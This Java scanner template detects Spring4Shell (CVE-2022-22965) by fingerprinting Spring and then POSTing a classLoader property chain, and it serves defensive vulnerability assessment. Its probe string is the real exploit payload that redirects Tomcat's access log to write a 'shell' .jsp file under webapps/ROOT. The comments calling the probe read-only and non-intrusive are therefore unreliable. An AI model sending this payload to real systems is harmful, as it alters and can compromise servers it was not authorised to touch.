// CERT-X-GEN Java Template
//
// @id: spring4shell-detection
// @name: Spring4Shell Detection (CVE-2022-22965)
// @author: CERT-X-GEN Security Team
// @severity: critical
// @description: Detects CVE-2022-22965 Spring Framework RCE via class binding gadget. Probes for vulnerable DataBinder behavior using classLoader property chain. Non-intrusive detection only - no webshell deployment.
// @tags: spring, java, rce, cve-2022-22965, spring4shell, class-binding
// @cwe: CWE-94
// @confidence: 85
// @references: https://nvd.nist.gov/vuln/detail/CVE-2022-22965, https://spring.io/security/cve-2022-22965, https://github.com/spring-projects/spring-framework/commit/7f7fb58dd0dae86d22268a4b59ac7c72a6c22529
//
// Compilation:
//   javac Spring4ShellDetection.java
//   java Spring4ShellDetection --target 127.0.0.1 --port 8080 --json
//
// When run by CERT-X-GEN engine, environment variables are set:
//   CERT_X_GEN_TARGET_HOST - Target host/IP
//   CERT_X_GEN_TARGET_PORT - Target port
//   CERT_X_GEN_MODE=engine - Indicates engine mode (JSON output required)
//
// JSON strategy: Zero-dependency manual serialization via StringBuilder.
//   Equivalent to: new JSONObject().put("key", "value").toString()
//   All findings output as valid JSON arrays to stdout.
//

import java.io.*;
import java.net.*;
import java.net.Socket;
import java.net.InetSocketAddress;
import java.time.Instant;
import java.util.*;

public class Spring4ShellDetection {

    private static final int TIMEOUT_MS = 10000;
    private static final String TEMPLATE_ID = "spring4shell-detection";
    private static final String TEMPLATE_NAME = "Spring4Shell Detection (CVE-2022-22965)";

    // =========================================
    // JSON ESCAPING UTILITY
    // =========================================
    static String escapeJson(String s) {
        if (s == null) return "";
        StringBuilder sb = new StringBuilder();
        for (char c : s.toCharArray()) {
            switch (c) {
                case '"':  sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\n': sb.append("\\n");  break;
                case '\r': sb.append("\\r");  break;
                case '\t': sb.append("\\t");  break;
                default:
                    if (c >= 32 && c < 127) sb.append(c);
                    break;
            }
        }
        return sb.toString();
    }

    // =========================================
    // FINDING MODEL
    // =========================================
    static class Finding {
        String templateId;
        String templateName;
        String severity;
        int confidence;
        String title;
        String description;
        String matchedAt;
        Map<String, String> evidence;
        String cwe;
        double cvssScore;
        String remediation;
        List<String> references;

        Finding() {
            evidence = new LinkedHashMap<>();
            references = new ArrayList<>();
            matchedAt = Instant.now().toString();
        }

        String toJson() {
            StringBuilder ev = new StringBuilder("{");
            boolean firstEv = true;
            for (Map.Entry<String, String> entry : evidence.entrySet()) {
                if (!firstEv) ev.append(",");
                ev.append("\"").append(escapeJson(entry.getKey())).append("\":\"")
                  .append(escapeJson(entry.getValue())).append("\"");
                firstEv = false;
            }
            ev.append("}");

            StringBuilder refs = new StringBuilder("[");
            for (int i = 0; i < references.size(); i++) {
                if (i > 0) refs.append(",");
                refs.append("\"").append(escapeJson(references.get(i))).append("\"");
            }
            refs.append("]");

            return String.format(
                "{\"template_id\":\"%s\",\"template_name\":\"%s\",\"severity\":\"%s\"," +
                "\"confidence\":%d,\"title\":\"%s\",\"description\":\"%s\"," +
                "\"matched_at\":\"%s\",\"evidence\":%s,\"cwe\":\"%s\",\"cvss_score\":%.1f," +
                "\"remediation\":\"%s\",\"references\":%s}",
                escapeJson(templateId), escapeJson(templateName), escapeJson(severity),
                confidence, escapeJson(title), escapeJson(description),
                escapeJson(matchedAt), ev.toString(), escapeJson(cwe),
                cvssScore, escapeJson(remediation), refs.toString()
            );
        }
    }

    // =========================================
    // HTTP HELPERS
    // =========================================
    static int lastStatusCode = 0;

    static String httpGet(String host, int port, String path, boolean useTls) {
        try {
            String scheme = useTls ? "https" : "http";
            URL url = new URL(scheme + "://" + host + ":" + port + path);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(TIMEOUT_MS);
            conn.setReadTimeout(TIMEOUT_MS);
            conn.setInstanceFollowRedirects(false);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Java SecurityScanner)");
            conn.setRequestProperty("Accept", "application/json,text/html,*/*");

            int code = conn.getResponseCode();
            lastStatusCode = code;

            InputStream rawIs = (code >= 200 && code < 400) ? conn.getInputStream() : conn.getErrorStream();
            if (rawIs == null) { conn.disconnect(); return ""; }

            StringBuilder sb = new StringBuilder();
            try (InputStream is = rawIs;
                 BufferedReader br = new BufferedReader(new InputStreamReader(is))) {
                String line;
                int chars = 0;
                while ((line = br.readLine()) != null && chars < 4096) {
                    sb.append(line).append("\n");
                    chars += line.length();
                }
            }
            conn.disconnect();
            return sb.toString();

        } catch (Exception e) {
            System.err.println("[spring4shell] GET failed: " + e.getMessage());
            lastStatusCode = -1;
            return null;
        }
    }

    static String httpPost(String host, int port, String path, String body, boolean useTls) {
        try {
            String scheme = useTls ? "https" : "http";
            URL url = new URL(scheme + "://" + host + ":" + port + path);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(TIMEOUT_MS);
            conn.setReadTimeout(TIMEOUT_MS);
            conn.setInstanceFollowRedirects(false);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Java SecurityScanner)");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Accept", "text/html,application/json,*/*");

            byte[] bodyBytes = body.getBytes("UTF-8");
            conn.setRequestProperty("Content-Length", String.valueOf(bodyBytes.length));

            try (OutputStream os = conn.getOutputStream()) {
                os.write(bodyBytes);
                os.flush();
            }

            int code = conn.getResponseCode();
            lastStatusCode = code;

            InputStream rawIs = (code >= 200 && code < 400) ? conn.getInputStream() : conn.getErrorStream();
            if (rawIs == null) { conn.disconnect(); return ""; }

            StringBuilder sb = new StringBuilder();
            try (InputStream is = rawIs;
                 BufferedReader br = new BufferedReader(new InputStreamReader(is))) {
                String line;
                int chars = 0;
                while ((line = br.readLine()) != null && chars < 4096) {
                    sb.append(line).append("\n");
                    chars += line.length();
                }
            }
            conn.disconnect();
            return sb.toString();

        } catch (Exception e) {
            System.err.println("[spring4shell] POST failed: " + e.getMessage());
            lastStatusCode = -1;
            return null;
        }
    }

    // =========================================
    // DETECTION LOGIC
    // =========================================

    static boolean isSpringApplication(String host, int port, boolean useTls,
                                        Map<String, String> evidence) {
        String[] probeEndpoints = {"/", "/actuator/health", "/actuator/info", "/error"};
        String[] springIndicators = {
            "Whitelabel Error Page", "spring", "Spring",
            "org.springframework", "X-Application-Context"
        };

        for (String ep : probeEndpoints) {
            String body = httpGet(host, port, ep, useTls);
            int code = lastStatusCode;
            if (body == null) continue;

            for (String indicator : springIndicators) {
                if (body.contains(indicator)) {
                    evidence.put("spring_indicator", indicator);
                    evidence.put("fingerprint_endpoint", ep);
                    evidence.put("fingerprint_status", String.valueOf(code));
                    evidence.put("fingerprint_body_snippet",
                        body.substring(0, Math.min(body.length(), 200)).replaceAll("\\s+", " "));
                    System.err.println("[spring4shell] Spring fingerprint found via " + ep
                        + " (indicator: " + indicator + ")");
                    return true;
                }
            }
            if (ep.contains("actuator") && code == 200) {
                evidence.put("spring_indicator", "actuator_endpoint_exposed");
                evidence.put("fingerprint_endpoint", ep);
                evidence.put("fingerprint_status", String.valueOf(code));
                return true;
            }
        }
        System.err.println("[spring4shell] No Spring fingerprint on " + host + ":" + port);
        return false;
    }

    /**
     * Phase 2: Class binding probe.
     * POSTs the CVE-2022-22965 classLoader property chain to common endpoints.
     * Patched Spring returns HTTP 400. Unpatched may return 200 or 5xx.
     * No webshell is written - read-only property traversal only.
     */
    static int classBindingProbe(String host, int port, boolean useTls) {
        String probeBody =
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di" +
            "&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" +
            "&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2FROOT" +
            "&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell" +
            "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=";

        String[] endpoints = {"/", "/login", "/index", "/home", "/api"};
        for (String ep : endpoints) {
            String body = httpPost(host, port, ep, probeBody, useTls);
            int code = lastStatusCode;
            System.err.println("[spring4shell] Class binding probe on " + ep + " -> HTTP " + code);
            if (code != -1 && body != null) return code;
        }
        return -1;
    }

    // =========================================
    // MAIN SCAN LOGIC
    // =========================================
    static List<Finding> executeScan(String host, int port) {
        List<Finding> findings = new ArrayList<>();
        Map<String, String> evidence = new LinkedHashMap<>();
        boolean useTls = (port == 443 || port == 8443);
        String matchedAt = host + ":" + port;

        System.err.println("[spring4shell] Starting scan on " + host + ":" + port + " (TLS=" + useTls + ")");

        // Phase 1: Spring Fingerprint
        boolean isSpring = isSpringApplication(host, port, useTls, evidence);

        if (!isSpring) {
            Finding info = new Finding();
            info.templateId = TEMPLATE_ID; info.templateName = TEMPLATE_NAME;
            info.severity = "info"; info.confidence = 90;
            info.title = "Spring4Shell: Target Does Not Appear to Be a Spring Application";
            info.description = "No Spring Framework indicators found on " + host + ":" + port
                + ". Target is unlikely to be vulnerable to CVE-2022-22965.";
            info.matchedAt = matchedAt;
            info.evidence.put("host", host); info.evidence.put("port", String.valueOf(port));
            info.evidence.put("spring_detected", "false");
            info.cwe = "CWE-94"; info.cvssScore = 0.0;
            info.remediation = "No action required.";
            info.references.add("https://nvd.nist.gov/vuln/detail/CVE-2022-22965");
            findings.add(info);
            return findings;
        }

        System.err.println("[spring4shell] Spring confirmed. Running class binding probe...");

        // Phase 2: Class Binding Probe
        evidence.put("host", host); evidence.put("port", String.valueOf(port));
        evidence.put("spring_detected", "true");

        int probeStatus = classBindingProbe(host, port, useTls);
        evidence.put("probe_http_status", String.valueOf(probeStatus));

        if (probeStatus == -1) {
            Finding f = new Finding();
            f.templateId = TEMPLATE_ID; f.templateName = TEMPLATE_NAME;
            f.severity = "info"; f.confidence = 40;
            f.title = "Spring4Shell: Class Binding Probe Inconclusive (Connection Failure)";
            f.description = "Target " + host + ":" + port
                + " fingerprinted as Spring but class binding probe requests all failed.";
            f.matchedAt = matchedAt; f.evidence.putAll(evidence);
            f.cwe = "CWE-94"; f.cvssScore = 0.0;
            f.remediation = "Ensure Spring Framework >= 5.3.18 or >= 5.2.20.";
            f.references.add("https://nvd.nist.gov/vuln/detail/CVE-2022-22965");
            f.references.add("https://spring.io/security/cve-2022-22965");
            findings.add(f);
            return findings;
        }

        if (probeStatus == 400) {
            Finding f = new Finding();
            f.templateId = TEMPLATE_ID; f.templateName = TEMPLATE_NAME;
            f.severity = "info"; f.confidence = 80;
            f.title = "Spring4Shell: Spring Application Detected - Class Binding Rejected (Patched)";
            f.description = "Target " + host + ":" + port
                + " returned HTTP 400 to class binding probe. DataBinder properly rejected "
                + "the classLoader property chain - Spring4Shell patch appears active.";
            f.matchedAt = matchedAt; f.evidence.putAll(evidence);
            f.evidence.put("vulnerability_status", "patched");
            f.cwe = "CWE-94"; f.cvssScore = 0.0;
            f.remediation = "System appears patched. Confirm Spring Framework >= 5.3.18 / 5.2.20.";
            f.references.add("https://nvd.nist.gov/vuln/detail/CVE-2022-22965");
            f.references.add("https://spring.io/security/cve-2022-22965");
            findings.add(f);
            return findings;
        }

        // Non-400 from a Spring app = suspicious
        String vulnStatus; String severity; double cvss; int confidence;
        if (probeStatus == 200) {
            vulnStatus = "likely_vulnerable"; severity = "critical"; cvss = 9.8; confidence = 85;
        } else if (probeStatus >= 500) {
            vulnStatus = "potentially_vulnerable"; severity = "high"; cvss = 9.8; confidence = 70;
        } else {
            vulnStatus = "inconclusive"; severity = "medium"; cvss = 5.0; confidence = 50;
        }
        evidence.put("vulnerability_status", vulnStatus);

        Finding vuln = new Finding();
        vuln.templateId = TEMPLATE_ID; vuln.templateName = TEMPLATE_NAME;
        vuln.severity = severity; vuln.confidence = confidence;
        vuln.title = "Spring4Shell (CVE-2022-22965): Class Binding Probe Not Rejected ("
            + vulnStatus.replace("_", " ").toUpperCase() + ")";
        vuln.description = "Target " + host + ":" + port
            + " is a Spring application. The CVE-2022-22965 class binding probe "
            + "(class.module.classLoader property chain) was NOT rejected with HTTP 400. "
            + "A patched Spring always returns 400 for this chain. HTTP " + probeStatus
            + " response suggests DataBinder accepted the classLoader binding - potential RCE. "
            + "Manual verification strongly recommended.";
        vuln.matchedAt = matchedAt; vuln.evidence = evidence;
        vuln.cwe = "CWE-94"; vuln.cvssScore = cvss;
        vuln.remediation = "Upgrade Spring Framework to >= 5.3.18 or >= 5.2.20. "
            + "Apply WAF rules blocking 'class.module.classLoader' in request params. "
            + "See: https://spring.io/security/cve-2022-22965";
        vuln.references.add("https://nvd.nist.gov/vuln/detail/CVE-2022-22965");
        vuln.references.add("https://spring.io/security/cve-2022-22965");
        vuln.references.add("https://www.rapid7.com/blog/post/2022/03/30/spring4shell-zero-day-vulnerability-in-spring-framework/");
        vuln.references.add("https://github.com/spring-projects/spring-framework/commit/7f7fb58dd0dae86d22268a4b59ac7c72a6c22529");
        findings.add(vuln);
        return findings;
    }

    // =========================================
    // ENTRY POINT
    // =========================================
    public static void main(String[] args) {
        String host = null;
        int port = 8080;
        boolean jsonMode = false;

        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--target": if (i + 1 < args.length) host = args[++i]; break;
                case "--port":
                    if (i + 1 < args.length) {
                        try { port = Integer.parseInt(args[++i]); }
                        catch (NumberFormatException e) { /* keep default */ }
                    }
                    break;
                case "--json": jsonMode = true; break;
                default: if (host == null && !args[i].startsWith("-")) host = args[i]; break;
            }
        }

        String envHost = System.getenv("CERT_X_GEN_TARGET_HOST");
        String envPort = System.getenv("CERT_X_GEN_TARGET_PORT");
        String envMode = System.getenv("CERT_X_GEN_MODE");

        if (envHost != null && !envHost.isEmpty()) host = envHost;
        if (envPort != null && !envPort.isEmpty()) {
            try { port = Integer.parseInt(envPort); } catch (NumberFormatException e) {}
        }
        if (envMode != null) jsonMode = true;

        if (host == null || host.isEmpty()) {
            System.err.println("[spring4shell] Error: No target specified. Use --target <host>");
            System.out.println("[]");
            System.exit(1);
        }

        if (!jsonMode) {
            System.out.println("\n╔═══════════════════════════════════════════════════════════╗");
            System.out.println("║  Spring4Shell Detection (CVE-2022-22965)                  ║");
            System.out.println("║  CERT-X-GEN Security Template                             ║");
            System.out.println("╚═══════════════════════════════════════════════════════════╝\n");
            System.out.println("Target: " + host + ":" + port);
        }

        List<Finding> findings = executeScan(host, port);

        StringBuilder json = new StringBuilder("[");
        for (int i = 0; i < findings.size(); i++) {
            if (i > 0) json.append(",");
            json.append(findings.get(i).toJson());
        }
        json.append("]");
        System.out.println(json.toString());
    }
}
